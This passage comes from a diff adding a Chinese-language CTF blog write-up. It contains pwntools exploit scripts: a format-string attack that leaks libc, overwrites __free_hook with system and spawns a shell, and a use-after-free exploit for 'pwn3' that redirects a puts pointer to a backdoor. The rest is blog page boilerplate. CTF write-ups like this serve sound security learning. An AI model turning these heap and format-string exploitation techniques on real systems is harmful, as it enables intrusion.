class="params">(index)</span>:</span></span><br><span class="line">	menu(<span class="number">2</span>)</span><br><span class="line">	sla(<span class="string">"id: "</span>,index)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span><span class="params">(index,content)</span>:</span></span><br><span class="line">	menu(<span class="number">3</span>)</span><br><span class="line">	sla(<span class="string">"id: "</span>,index)</span><br><span class="line">	sa(<span class="string">"content: "</span>,content)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">free</span><span class="params">(index)</span>:</span></span><br><span class="line">	menu(<span class="number">4</span>)</span><br><span class="line">	sla(<span class="string">"id: "</span>,index)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exp</span><span class="params">(index)</span>:</span></span><br><span class="line">	<span class="keyword">print</span> <span class="string">"exploition"</span></span><br><span class="line">	catflag(i)</span><br><span class="line"></span><br><span class="line">choice()</span><br><span class="line">debug()</span><br><span class="line">menu(<span class="string">"vim 2"</span>)</span><br><span class="line">menu(<span class="string">"%35$p"</span>)</span><br><span class="line">menu(<span class="string">"cat 2"</span>)</span><br><span class="line">ru(<span class="string">'0x'</span>)</span><br><span class="line">libc_base=int(r(<span class="number">12</span>),<span class="number">16</span>)-(<span class="number">0x7ffff7a2d830</span><span class="number">-0x7ffff7a0d000</span>)</span><br><span class="line">leak(<span class="string">"libc_base"</span>,libc_base)</span><br><span class="line">system=libc_base+libc.symbols[<span class="string">'system'</span>]</span><br><span class="line">free_hook=libc_base+libc.symbols[<span class="string">'__free_hook'</span>]</span><br><span class="line">menu(<span class="string">"vim 2"</span>)</span><br><span class="line">menu(<span class="string">"%"</span>+str(system&amp;<span class="number">0xffff</span>)+<span class="string">"c%11$hn"</span>)</span><br><span class="line">menu(<span class="string">"cat 2aaa"</span>+p64(free_hook))</span><br><span class="line">menu(<span class="string">"vim 2"</span>)</span><br><span class="line">menu(<span class="string">"%"</span>+str((system&gt;&gt;<span class="number">16</span>)&amp;<span class="number">0xffff</span>)+<span class="string">"c%11$hn"</span>)</span><br><span class="line">menu(<span class="string">"cat 2aaa"</span>+p64(free_hook+<span class="number">2</span>))</span><br><span class="line">menu(<span class="string">"vim 2"</span>)</span><br><span class="line">menu(<span class="string">"%"</span>+str((system&gt;&gt;<span class="number">32</span>)&amp;<span class="number">0xffff</span>)+<span class="string">"c%11$hn"</span>)</span><br><span class="line">menu(<span class="string">"cat 2aaa"</span>+p64(free_hook+<span class="number">4</span>))</span><br><span class="line">menu(<span class="string">"vim 1"</span>)</span><br><span class="line">menu(<span class="string">"/bin/sh\x00"</span>)</span><br><span class="line">menu(<span class="string">"rm 1"</span>)</span><br><span class="line">irt()</span><br></pre></td></tr></table></figure>
+
+<h3 id="pwn3"><a href="#pwn3" class="headerlink" title="pwn3:"></a>pwn3:</h3><p>UAF漏洞，直接劫持puts指针为后门函数地址就可以了。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> PwnContext <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#context.terminal = ['tmux', 'splitw', '-h']</span></span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line">s       = <span class="keyword">lambda</span> data               :ctx.send(str(data))        <span class="comment">#in case that data is an int</span></span><br><span class="line">sa      = <span class="keyword">lambda</span> delim,data         :ctx.sendafter(str(delim), str(data)) </span><br><span class="line">sl      = <span class="keyword">lambda</span> data               :ctx.sendline(str(data)) </span><br><span class="line">sla     = <span class="keyword">lambda</span> delim,data         :ctx.sendlineafter(str(delim), str(data)) </span><br><span class="line">r       = <span class="keyword">lambda</span> numb=<span class="number">4096</span>          :ctx.recv(numb)</span><br><span class="line">ru      = <span class="keyword">lambda</span> delims, drop=<span class="literal">True</span>  :ctx.recvuntil(delims, drop)</span><br><span class="line">irt     = <span class="keyword">lambda</span>                    :ctx.interactive()</span><br><span class="line">rs      = <span class="keyword">lambda</span> *args, **kwargs    :ctx.start(*args, **kwargs)</span><br><span class="line">dbg     = <span class="keyword">lambda</span> gs=<span class="string">''</span>, **kwargs    :ctx.debug(gdbscript=gs, **kwargs)</span><br><span class="line"><span class="comment"># misc functions</span></span><br><span class="line">uu32    = <span class="keyword">lambda</span> data   :u32(data.ljust(<span class="number">4</span>, <span class="string">'\x00'</span>))</span><br><span class="line">uu64    = <span class="keyword">lambda</span> data   :u64(data.ljust(<span class="number">8</span>, <span class="string">'\x00'</span>))</span><br><span class="line">leak    = <span class="keyword">lambda</span> name,addr :log.success(<span class="string">'&#123;&#125; = &#123;:#x&#125;'</span>.format(name, addr))</span><br><span class="line"></span><br><span class="line">ctx.binary = <span class="string">'pwn3'</span></span><br><span class="line">libc=ELF(<span class="string">"/lib/x86_64-linux-gnu/libc.so.6"</span>)</span><br><span class="line">ctx.debug_remote_libc = <span class="literal">False</span></span><br><span class="line">local=<span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">choice</span><span class="params">()</span>:</span></span><br><span class="line">	<span class="keyword">if</span>(local):</span><br><span class="line">		p=rs()</span><br><span class="line">	<span class="keyword">else</span>:</span><br><span class="line">		ctx.remote = (<span class="string">'59.110.243.101'</span>,<span class="number">54621</span>)</span><br><span class="line">		p=rs(<span class="string">'remote'</span>)</span><br><span class="line">	<span class="keyword">return</span> p</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">debug</span><span class="params">()</span>:</span></span><br><span class="line">	<span class="keyword">if</span>(local==<span class="number">1</span>):</span><br><span class="line">		libc_base = ctx.bases.libc</span><br><span class="line">		<span class="keyword">print</span> hex(libc_base)</span><br><span class="line">		ctx.symbols = &#123;<span class="string">'sym1'</span>:<span class="number">0xEDA</span> , <span class="string">'sym2'</span>:<span class="number">0x10AF</span>&#125;</span><br><span class="line">		ctx.breakpoints = [<span class="number">0xEDA</span>,<span class="number">0x10AF</span>]</span><br><span class="line">		ctx.debug()</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">menu</span><span class="params">(index)</span>:</span></span><br><span class="line">	sla(<span class="string">"Your choice :"</span>,index)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">create</span><span class="params">(size,content)</span>:</span></span><br><span class="line">	menu(<span class="number">1</span>)</span><br><span class="line">	sla(<span class="string">"magic cost ?:"</span>,size)</span><br><span class="line">	sa(<span class="string">"name :"</span>,content)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span><span class="params">(index)</span>:</span></span><br><span class="line">	menu(<span class="number">3</span>)</span><br><span class="line">	sla(<span class="string">"index :"</span>,index)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">free</span><span class="params">(index)</span>:</span></span><br><span class="line">	menu(<span class="number">2</span>)</span><br><span class="line">	sla(<span class="string">"index :"</span>,index)</span><br><span class="line"></span><br><span class="line">choice()</span><br><span class="line">create(<span class="number">0x10</span>,<span class="string">"1231231"</span>)</span><br><span class="line">create(<span class="number">0x20</span>,<span class="string">"1232123"</span>)</span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line">create(<span class="number">0x10</span>,p64(<span class="number">0x1231212</span>)+p64(<span class="number">0x400A0D</span>))</span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line">irt()</span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="玄武组"><a href="#玄武组" class="headerlink" title="玄武组"></a>玄武组</h2><p>个人认为本组最难，因为考研要复习，这场没有打，而且应该全部是里通过angr盲打求解来解题，个人不会。</p>
+
+      </div>
+
+      <div class="article-footer">
+        <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/UAF/" rel="tag">#UAF</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/VMpwn/" rel="tag">#VMpwn</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/shellcode/" rel="tag">#shellcode</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2/" rel="tag">#格式化字符串</a></li></ul>
+      </div>
+
+      <div class="article-navs">
+        
+<nav class="card-container card-article-nav">
+  <div class="card-wrap">
+    
+      <div id="article-nav-newer" class="card-item img">
+        <article>
+          
+            <div class="card-cover" style="background-image: url(/css/images/starfish.jpg)"></div>
+          
+          <a class="card-link article-nav-link" href="/2020/05/24/GKCTF_Pwn%E5%87%BA%E9%A2%98%E6%80%9D%E8%B7%AF-%E5%88%A9%E7%94%A8/"></a>
+          <strong class="article-nav-caption">Newer</strong>
+          <p class="article-nav-title">
+            
+              GKCTF_pwn出题思路&amp;利用
+            
+          </p>
+        </article>
+      </div>
+    
+    
+      <div id="article-nav-older" class="card-item img">
+        <article>
+          
+            <div class="card-cover" style="background-image: url(/css/images/sunset.jpg)"></div>
+          
+          <a class="card-link article-nav-link" href="/2020/05/06/2020De1CTF%E9%83%A8%E5%88%86pwn-Writeup/"></a>
+          <strong class="article-nav-caption">Older</strong>
+          <p class="article-nav-title">
+            
+              2020De1CTF部分pwn_Writeup
+            
+          </p>
+        </article>
+      </div>
+    
+  </div>
+</nav>
+
+      </div>
+      
+      
+
+  
+  <div class="valine-container">
+    <div id="valine_thread" class="valine-thread"></div>
+  </div>
+
+  
+  
+
+
+    </div>
+  </article>
+</div></section>
+
+    <!-- footer container -->
+<footer id="footer" class="footer">
+  <div class="footer-container">
+    <p>&copy; 2020 <a href="/" target="_blank">Whali3n51</a></p>
+
+    
+      <p id="hitokoto"></p>
+      <script src="https://v1.hitokoto.cn/?c=f&amp;encode=js&select=%23hitokoto" defer></script>
+    
+
+    
+
+    <p>Powered by <a href="https://hexo.io" target="_blank">Hexo</a> Theme - <a href="https://github.com/miiiku/flex-block" target="_blank">flex-block</a></p>
+  </div>
+</footer>
+  </div>
+
+  
+  
+
+
+  <!-- aplayer 音频 start -->
+  <link rel="stylesheet" href="/lib/APlayer.min.css">
+  <script src="/lib/APlayer.min.js"></script>
+  <script type="text/javascript">
+    const aplayer = document.querySelectorAll(".aplayer");
+    aplayer && initaplayer(aplayer);
+    function initaplayer(els) {
+      let elsArr = Array.from(els);
+      elsArr.forEach(el => {
+        new APlayer({
+          container: el,
+          audio: { ...el.dataset },
+          theme: "#b7daff",
+          lrcType: 3,
+          autoplay: false,
+          loop: false,
+          mutex: true,
+        });
+      });
+    }
+  </script>
+  <!-- aplayer 音频 end -->
+  
+
+<!-- dplayer 视频 start -->
+<link rel="stylesheet" href="/lib/DPlayer.min.css">
+<script src="/lib/DPlayer.min.js"></script>
+<script type="text/javascript">
+  const dplayer = document.querySelectorAll(".dplayer");
+  dplayer && initDPlayer(dplayer);
+  function initDPlayer(els) {
+    let elsArr = Array.from(els);
+    elsArr.forEach(el => {
+      let url = el.dataset.url;
+      let cover = el.dataset.cover;
+      new DPlayer({
+        container: el,
+        video: { url: url, pic: cover },
+        theme: "#b7daff",
+        autoplay: false,
+        loop: false,
+        mutex: true,
+      });
+    });
+  }
+</script>
+<!-- dplayer 视频 end -->
+
+
+<!-- waterfall 瀑布流 start -->
+<script src="/lib/waterfall.min.js"></script>
+<script type="text/javascript">
+
+const waterfalls = document.querySelectorAll(".waterfall-container");
+
+if (waterfalls && waterfalls.length > 0) {
+  waterfalls.forEach((waterfall, index) => {
+    let cls = "waterfall-container-" + index;
+    waterfall.classList.add(cls);
+    initWaterfall(cls, waterfall);
+  });
+}
+
+function initWaterfall(selector, el) {
+  const options = {};
+  if (Object.keys(el.dataset).length > 0) {
+    for (let k in el.dataset) {
+      options[k] = el.dataset[k];
+    }
+  }
+  waterfall(`.${selector}`, options);
+}
+</script>
+<!-- waterfall 瀑布流 end -->
+
+
+  <!-- zoom start -->
+  <script src="/lib/zoom.min.js"></script>
+  <script type="text/javascript">
+    document.querySelector(".article-content") && zoom(".article-content");
+  </script>
+  <!-- zoom end -->
+  
+
+
+
+  
+
+
+  
+
+
+  
+
+
+
+<script src="/js/script.js"></script>
+  
+  <!-- 尾部用户自定义相关内容 -->
+
+</body>
+</html>
